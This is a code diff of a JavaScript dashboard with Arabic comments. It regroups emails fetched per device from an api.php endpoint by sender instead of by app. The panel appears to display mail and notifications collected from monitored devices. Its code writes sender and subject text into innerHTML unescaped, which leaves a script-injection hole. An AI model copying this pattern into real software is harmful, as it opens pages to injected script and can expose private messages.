@@ -212,7 +212,7 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
-// ✅ تحميل رسائل البريد — مجمعة في مربعات
+// ✅ تحميل رسائل البريد — كل بريد في مربع منفصل حسب المرسل
 async function loadEmails() {
     try {
         const response = await fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
@@ -228,30 +228,32 @@ async function loadEmails() {
             return;
         }
         
+        // ✅ كل بريد في مربع منفصل — حسب المرسل
         const groups = {};
         emails.forEach(email => {
-            const app = email.app_name || 'Email';
-            if (!groups[app]) groups[app] = [];
-            groups[app].push(email);
+            const sender = email.sender || 'غير معروف';
+            if (!groups[sender]) groups[sender] = [];
+            groups[sender].push(email);
         });
         
-        Object.keys(groups).forEach(app => {
-            const appEmails = groups[app];
-            const lastEmail = appEmails[0];
+        Object.keys(groups).forEach(sender => {
+            const senderEmails = groups[sender];
+            const lastEmail = senderEmails[0];
+            const appName = lastEmail.app_name || 'Email';
             
             const groupDiv = document.createElement('div');
             groupDiv.className = 'conversation-item';
             groupDiv.style.cursor = 'pointer';
-            groupDiv.onclick = () => openEmailGroup(app, groupDiv);
+            groupDiv.onclick = () => openEmailGroup(sender, groupDiv);
             
             groupDiv.innerHTML = `
                 <div class="conversation-avatar">📧</div>
                 <div class="conversation-info">
-                    <div class="conversation-name">${app}</div>
-                    <div class="conversation-preview">${lastEmail.subject || ''}</div>
-                    <div class="conversation-time">📅 ${formatDate(lastEmail.timestamp)} | عدد الرسائل: ${appEmails.length}</div>
+                    <div class="conversation-name">${sender}</div>
+                    <div class="conversation-preview">${appName} — ${lastEmail.subject || ''}</div>
+                    <div class="conversation-time">📅 ${formatDate(lastEmail.timestamp)} | عدد الرسائل: ${senderEmails.length}</div>
                 </div>
-                <div class="conversation-count">${appEmails.length}</div>
+                <div class="conversation-count">${senderEmails.length}</div>
             `;
             
             div.appendChild(groupDiv);
@@ -263,8 +265,8 @@ async function loadEmails() {
     } catch (e) {}
 }
 
-// ✅ فتح مجموعة بريد
-function openEmailGroup(app, groupDiv) {
+// ✅ فتح مجموعة بريد — تظهر كل رسائل المرسل
+function openEmailGroup(sender, groupDiv) {
     const existingBox = groupDiv.nextElementSibling;
     if (existingBox && existingBox.classList.contains('email-box')) {
         existingBox.remove();
@@ -278,14 +280,14 @@ function openEmailGroup(app, groupDiv) {
     fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`)
         .then(res => res.json())
         .then(emails => {
-            const appEmails = emails.filter(e => (e.app_name || 'Email') === app)
+            const senderEmails = emails.filter(e => (e.sender || 'غير معروف') === sender)
                 .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
             
-            appEmails.forEach(email => {
+            senderEmails.forEach(email => {
                 const item = document.createElement('div');
                 item.style.cssText = 'padding:12px;border-bottom:1px solid #222;';
                 item.innerHTML = `
-                    <div style="color:#00ffcc;font-size:14px;font-weight:bold;">📧 ${email.sender || 'غير معروف'}</div>
+                    <div style="color:#00ffcc;font-size:14px;font-weight:bold;">📧 ${email.app_name || 'Email'}</div>
                     <div style="color:#ccc;font-size:13px;margin-top:3px;">${email.subject || ''}</div>
                     <div style="color:#888;font-size:11px;margin-top:3px;">📅 ${formatDate(email.timestamp)}</div>
                 `;
